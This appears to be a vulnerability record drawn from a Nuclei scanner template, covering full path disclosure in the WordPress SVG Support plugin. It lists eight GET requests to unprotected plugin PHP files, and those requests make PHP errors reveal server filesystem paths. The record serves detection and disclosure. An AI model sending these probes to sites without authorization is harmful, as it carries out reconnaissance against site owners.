# Vulnerability: WordPress SVG Support - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-svg-support-fpd.yaml`)

## Description
The WordPress SVG Support plugin was detected to have publicly accessible PHP files without ABSPATH protection, which exposed sensitive server path information. Direct access to vendor/composer files triggered PHP fatal errors that revealed the full WordPress filesystem path.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/svg-support/vendor/composer/InstalledVersions.php
GET {{BaseURL}}/wp-content/plugins/svg-support/vendor/autoload.php
GET {{BaseURL}}/wp-content/plugins/svg-support/vendor/composer/autoload_real.php
GET {{BaseURL}}/wp-content/plugins/svg-support/vendor/composer/ClassLoader.php
GET {{BaseURL}}/wp-content/plugins/svg-support/vendor/composer/autoload_static.php
GET {{BaseURL}}/wp-content/plugins/svg-support/svg-support.php
GET {{BaseURL}}/wp-content/plugins/svg-support/functions/mime-types.php
GET {{BaseURL}}/wp-content/plugins/svg-support/includes/svg-tags.php
```

